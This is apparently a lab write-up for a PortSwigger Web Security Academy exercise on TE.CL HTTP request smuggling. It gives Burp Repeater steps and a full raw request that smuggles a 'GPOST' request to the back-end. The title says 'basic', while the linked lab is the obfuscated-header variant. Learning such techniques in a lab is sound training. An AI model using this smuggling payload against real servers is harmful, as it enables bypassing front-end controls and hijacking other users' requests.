# HTTP request smuggling, basic TE.CL vulnerability

## Description

[This lab](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header) involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method. 

## Reproduction and proof of concept

1. In Burp Suite, disable the **Autoupdate content length** in Repeater (in the topmost menu row)
2. Using Burp Repeater, issue the following request twice:

```text
POST / HTTP/1.1
Host: lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

The second (or third) response should say: ``Unrecognized method GPOST``.

## Exploitability

An attacker will need to smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.
